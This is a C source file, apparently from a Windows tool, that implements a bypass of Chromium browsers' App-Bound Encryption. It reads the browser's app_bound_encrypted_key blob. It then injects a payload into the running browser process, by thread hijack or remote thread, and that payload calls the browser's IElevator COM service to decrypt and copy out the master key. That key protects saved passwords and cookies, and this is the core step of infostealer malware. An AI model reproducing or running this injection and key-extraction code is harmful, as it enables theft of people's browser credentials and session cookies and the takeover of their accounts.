#include "AbeDecrypt.h"

/*** data shared with the in-browser payload ***/

#pragma data_seg(".abedata")
__declspec(allocate(".abedata"))
volatile LONG g_Pending = 0;
__declspec(allocate(".abedata"))
volatile LONG g_Code = (LONG)E_FAIL;
__declspec(allocate(".abedata"))
volatile BYTE g_Key[ABE_KEY_SIZE];
#pragma data_seg()

/* request block patched into the mapped image before injection */
#pragma data_seg(".abereq")
__declspec(allocate(".abereq"))
volatile ABE_REQUEST g_Request = { 0 };
#pragma data_seg()

/* prepares the request block used by the payload: the base64-decoded
   app_bound_encrypted_key blob (APPB prefix kept); requires WinRT on the
   calling thread */
_Success_(return != FALSE)
BOOL
AbePrepareRequest(
    _In_ const NET_BROWSER_INFO* Browser)
{
    ULONG BlobLength = sizeof(g_Request.Blob);  /* in/out capacity */
    HRESULT Hr;
    ULONGLONG Step;
    BOOL Ok;

    Step = AbeStepStart();
    Ok = AbeReadOsCryptBlob(Browser->UserDataDir,
                            L"app_bound_encrypted_key",
                            (PBYTE)g_Request.Blob,
                            sizeof(g_Request.Blob),
                            &BlobLength,
                            &Hr);
    AbeLogStepHr(L"v20 request", L"read app_bound_encrypted_key", Hr, Step);
    if (!Ok)
    {
        return FALSE;
    }
    Step = AbeStepStart();
    Hr = BlobLength > 4 && memcmp((PVOID)g_Request.Blob, "APPB", 4) == 0 ?
        S_OK : HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
    AbeLogStepHr(L"v20 request", L"validate APPB blob", Hr, Step);
    if (FAILED(Hr))
    {
        return FALSE;
    }
    g_Request.BrowserType = Browser->Type;
    g_Request.BlobLength = BlobLength;
    return TRUE;
}

/*** payload: runs inside the browser process ***/

/* IElevator::DecryptData vtable slot signature */
typedef HRESULT (WINAPI *PFN_IELEVATOR_DECRYPT_DATA)(PVOID This, BSTR In, BSTR* Out, DWORD* LastError);

/* IUnknown::Release vtable slot signature */
typedef ULONG (WINAPI *PFN_IUNKNOWN_RELEASE)(PVOID This);

#define ABE_GET_PROC(Module, Function) \
    NT_SUCCESS(PS_GetProcAddress((Module), (PCANSI_STRING)&Function##Name, (PVOID*)&pfn##Function))

VOID
AbePayloadWorker(VOID)
{
    static UNICODE_STRING Ole32Dll = RTL_CONSTANT_STRING(L"ole32.dll");
    static UNICODE_STRING OleAut32Dll = RTL_CONSTANT_STRING(L"oleaut32.dll");
    static ANSI_STRING CoInitializeExName = RTL_CONSTANT_STRING("CoInitializeEx");
    static ANSI_STRING CoUninitializeName = RTL_CONSTANT_STRING("CoUninitialize");
    static ANSI_STRING CoCreateInstanceName = RTL_CONSTANT_STRING("CoCreateInstance");
    static ANSI_STRING CoSetProxyBlanketName = RTL_CONSTANT_STRING("CoSetProxyBlanket");
    static ANSI_STRING SysAllocStringByteLenName = RTL_CONSTANT_STRING("SysAllocStringByteLen");
    static ANSI_STRING SysStringByteLenName = RTL_CONSTANT_STRING("SysStringByteLen");
    static ANSI_STRING SysFreeStringName = RTL_CONSTANT_STRING("SysFreeString");
    const ABE_BROWSER* Browser = NULL;
    typeof(&CoInitializeEx) pfnCoInitializeEx;
    typeof(&CoUninitialize) pfnCoUninitialize;
    typeof(&CoCreateInstance) pfnCoCreateInstance;
    typeof(&CoSetProxyBlanket) pfnCoSetProxyBlanket;
    typeof(&SysAllocStringByteLen) pfnSysAllocStringByteLen;
    typeof(&SysStringByteLen) pfnSysStringByteLen;
    typeof(&SysFreeString) pfnSysFreeString;
    PVOID Ole32, OleAut32;
    PVOID Elevator = NULL;
    BSTR In = NULL, Out = NULL;
    DWORD LastError;
    LONG Code = (LONG)E_FAIL;
    HRESULT Hr = E_FAIL;

    /* runs before CRT init in the remote image: everything must be resolved
       dynamically, and only g_Pending/g_Code/g_Key (.abedata) may be written */
    if (g_Request.BrowserType < NetBrowserMax)
    {
        Browser = &AbeBrowsers[g_Request.BrowserType];
    }
    if (Browser != NULL &&
        memcmp((PVOID)g_Request.Blob, "APPB", 4) == 0 &&
        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &Ole32Dll, &Ole32)) &&
        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &OleAut32Dll, &OleAut32)) &&
        ABE_GET_PROC(Ole32, CoInitializeEx) &&
        ABE_GET_PROC(Ole32, CoUninitialize) &&
        ABE_GET_PROC(Ole32, CoCreateInstance) &&
        ABE_GET_PROC(Ole32, CoSetProxyBlanket) &&
        ABE_GET_PROC(OleAut32, SysAllocStringByteLen) &&
        ABE_GET_PROC(OleAut32, SysStringByteLen) &&
        ABE_GET_PROC(OleAut32, SysFreeString))
    {
        /* RPC_E_CHANGED_MODE: the thread already has another apartment, still usable */
        HRESULT CoHr = pfnCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

        if (SUCCEEDED(CoHr) || CoHr == RPC_E_CHANGED_MODE)
        {
            Hr = pfnCoCreateInstance(&Browser->Clsid,
                                     NULL,
                                     CLSCTX_LOCAL_SERVER,
                                     &Browser->Iid,
                                     &Elevator);
            if (SUCCEEDED(Hr))
            {
                Hr = pfnCoSetProxyBlanket(Elevator,
                                          RPC_C_AUTHN_DEFAULT,
                                          RPC_C_AUTHZ_DEFAULT,
                                          NULL,
                                          RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                          RPC_C_IMP_LEVEL_IMPERSONATE,
                                          NULL,
                                          EOAC_DYNAMIC_CLOAKING);
                if (SUCCEEDED(Hr))
                {
                    In = pfnSysAllocStringByteLen((PCSTR)g_Request.Blob + 4,
                                                  g_Request.BlobLength - 4);
                    if (In == NULL)
                    {
                        Hr = E_OUTOFMEMORY;
                    } else
                    {
                        Hr = ((PFN_IELEVATOR_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
                            Elevator,
                            In,
                            &Out,
                            &LastError);
                        if (SUCCEEDED(Hr) && Out != NULL && pfnSysStringByteLen(Out) == ABE_KEY_SIZE)
                        {
                            RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
                            Code = 0;
                        }
                    }
                }
                ((PFN_IUNKNOWN_RELEASE)((*(PVOID***)Elevator)[2]))(Elevator);
            }
            if (SUCCEEDED(CoHr))
            {
                pfnCoUninitialize();
            }
        }
        /* release the COM allocations in the host (browser) process */
        if (In != NULL)
        {
            pfnSysFreeString(In);
        }
        if (Out != NULL)
        {
            pfnSysFreeString(Out);
        }
    }
    g_Code = Code == 0 ? 0 : (LONG)(FAILED(Hr) ? Hr : E_FAIL);
    g_Pending = 1;
}

#undef ABE_GET_PROC

/* Hijack entry: zero-arg, parks until reaped */
VOID
AbeHijackEntry(VOID)
{
    AbePayloadWorker();
    for (;;)
    {
        PS_DelayExec(INFINITE);
    }
}

/* Inject entry: thread-proc signature, returns so the remote thread can exit */
DWORD WINAPI
AbeInjectEntry(LPVOID Param)
{
    UNREFERENCED_PARAMETER(Param);
    AbePayloadWorker();
    return 0;
}
